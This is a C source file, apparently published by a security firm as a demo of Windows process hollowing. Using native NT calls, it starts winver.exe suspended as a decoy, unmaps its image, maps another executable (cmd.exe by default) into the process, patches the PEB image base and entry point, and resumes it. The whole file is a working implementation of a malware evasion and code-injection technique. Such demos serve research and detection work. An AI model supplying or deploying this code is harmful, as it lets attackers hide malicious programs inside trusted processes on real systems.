/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#define PHNT_VERSION PHNT_WIN11
#include <phnt_windows.h>
#include <phnt.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[])
{
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK isb;
    PROCESS_INFORMATION processInfo = { 0 };
    HANDLE hFile = NULL;
    HANDLE hSection = NULL;
    PVOID localImageMapping = NULL;

    wprintf_s(L"Demo for Process Hollowing by Hunt & Hackett.\r\n");
    wprintf_s(L"Usage: Hollowing.exe [filename]\r\n\r\n");

    // Create a process for hollowing
    STARTUPINFOW startupInfo = { sizeof(startupInfo) };
    startupInfo.lpTitle = L"Hello from a hollowed process!";
    PWSTR decoyApp = L"C:\\Windows\\system32\\winver.exe";

    if (!CreateProcessW(
        decoyApp,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        L"C:\\Windows\\system32",
        &startupInfo,
        &processInfo
    ))
    {
        status = NTSTATUS_FROM_WIN32(GetLastError());
        wprintf_s(L"CreateProcessW: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine its image location
    SECTION_IMAGE_INFORMATION imageInfo;

    status = NtQueryInformationProcess(
        processInfo.hProcess,
        ProcessImageInformation,
        &imageInfo,
        sizeof(imageInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for image section: %x\r\n", status);
        goto CLEANUP;
    }

    // Unmap the original image
    status = NtUnmapViewOfSection(
        processInfo.hProcess,
        imageInfo.TransferAddress
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtUnmapViewOfSection for original image: %x\r\n", status);
        goto CLEANUP;
    }

    // Convert the path to the new executable file to NT format
    UNICODE_STRING fileName;

    if (argc > 1)
    {
        status = RtlDosPathNameToNtPathName_U_WithStatus(
            argv[1],
            &fileName,
            NULL,
            NULL
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus: %x\r\n", status);
            goto CLEANUP;
        }
    }
    else
    {
        RtlInitUnicodeString(&fileName, L"\\SystemRoot\\system32\\cmd.exe");
    }

    // Open the new executable
    InitializeObjectAttributes(&objAttr, &fileName, 0, NULL, NULL);
    status = NtOpenFile(
        &hFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (argc > 1)
    {
        RtlFreeUnicodeString(&fileName);
    }

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile for the new executable: %x\r\n", status);
        goto CLEANUP;
    }

    // Make an image section from it
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );

    NtClose(hFile);
    hFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection for the new executable: %x\r\n", status);
        goto CLEANUP;
    }

    // Map the new image into the target process
    PVOID imageBase;
    SIZE_T imageSize;
    imageBase = NULL;
    imageSize = 0;

    status = NtMapViewOfSection(
        hSection,
        processInfo.hProcess,
        &imageBase,
        0,
        0,
        NULL,
        &imageSize,
        ViewUnmap,
        0,
        PAGE_READONLY
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection in target process: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine process' PEB address
    PROCESS_BASIC_INFORMATION basicInfo;

    status = NtQueryInformationProcess(
        processInfo.hProcess,
        ProcessBasicInformation,
        &basicInfo,
        sizeof(basicInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for basic info: %x\r\n", status);
        goto CLEANUP;
    }

    // Update image base in PEB
    status = NtWriteVirtualMemory(
        processInfo.hProcess,
        &basicInfo.PebBaseAddress->ImageBaseAddress,
        &imageBase,
        sizeof(imageBase),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for updating image base: %x\r\n", status);
        goto CLEANUP;
    }

    SIZE_T localImageSize;
    localImageMapping = NULL;
    localImageSize = 0;

    // Map the image locally for parsing
    status = NtMapViewOfSection(
        hSection,
        NtCurrentProcess(),
        &localImageMapping,
        0,
        0,
        NULL,
        &localImageSize,
        ViewUnmap,
        0,
        PAGE_READONLY        
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection locally: %x\r\n", status);
        goto CLEANUP;
    }

    // Find the NT header in the PE file
    PIMAGE_NT_HEADERS imageHeaders;
    status = RtlImageNtHeaderEx(
        0,
        localImageMapping,
        localImageSize,
        &imageHeaders
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlImageNtHeaderEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine entrypoint location
    ULONG entrypointRva;
    entrypointRva = imageHeaders->OptionalHeader.AddressOfEntryPoint;

    NtUnmapViewOfSection(NtCurrentProcess(), localImageMapping);
    localImageMapping = NULL;

    // Read the initial thread context
    CONTEXT threadContext;
    memset(&threadContext, 0, sizeof(threadContext));
    threadContext.ContextFlags = CONTEXT_INTEGER;

    status = NtGetContextThread(processInfo.hThread, &threadContext);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtGetContextThread: %x\r\n", status);
        goto CLEANUP;
    }

    // Adjust thread start address
#if defined(_AMD64_)
    threadContext.Rcx = (ULONG_PTR)imageBase + entrypointRva;
#elif defined(_X86_)
    threadContext.Eax = (ULONG_PTR)imageBase + entrypointRva;
#else
    #error Unsupported platform
#endif
    
    status = NtSetContextThread(processInfo.hThread, &threadContext);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtSetContextThread: %x\r\n", status);
        goto CLEANUP;
    }

    // Resume its execution
    status = NtResumeThread(processInfo.hThread, NULL);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtResumeThread: %x\r\n", status);
        goto CLEANUP;
    }

    // Do not terminate the process on success
    NtClose(processInfo.hProcess);
    processInfo.hProcess = NULL;

    status = STATUS_SUCCESS;
    wprintf_s(L"Successfully created process with PID %u.\r\n", processInfo.dwProcessId);

CLEANUP:

    if (processInfo.hProcess)
    {
        NtTerminateProcess(processInfo.hProcess, STATUS_CANCELLED);
        NtClose(processInfo.hProcess);
    }

    if (processInfo.hThread)
        NtClose(processInfo.hThread);

    if (hFile)
        NtClose(hFile);

    if (hSection)
        NtClose(hSection);

    if (localImageMapping)
        NtUnmapViewOfSection(NtCurrentProcess(), localImageMapping);

    return status;
}
